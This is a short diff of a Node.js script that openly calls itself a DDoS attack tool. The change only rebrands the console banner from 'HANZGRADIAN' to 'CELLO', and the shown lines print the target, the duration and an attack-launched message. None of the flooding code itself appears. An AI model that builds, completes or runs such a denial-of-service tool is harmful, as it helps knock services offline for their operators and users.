@@ -216,7 +216,7 @@ const RESTART_DELAY = 1000;
 
 if (cluster.isMaster) {
     console.log("═════════════════════════════════════════════════════════════".gray);
-    console.log(` HANZGRADIAN DDOS ATTACK`.red.bold);
+    console.log(` CELLO DDOS ATTACK PANEL`.red.bold);
     console.log("═════════════════════════════════════════════════════════════".gray);
     console.log(` >> Target       : `.brightYellow + process.argv[2]);
     console.log(` >> Duration     : `.brightYellow + process.argv[3] + " seconds");
@@ -226,7 +226,7 @@ if (cluster.isMaster) {
     console.log("═════════════════════════════════════════════════════════════".gray);
     console.log(` [!] Attack launched successfully`.brightRed);
     console.log("═════════════════════════════════════════════════════════════".gray);
-    console.log("HANZGRADIAN DDOS | HIGH RQ/S GLORY CUSTOM".yellow.bold);
+    console.log("CELLO DDOS | HIGH RQ/S GLORY CUSTOM".yellow.bold);
     
     const restartScript = () => {
         for (const id in cluster.workers) {
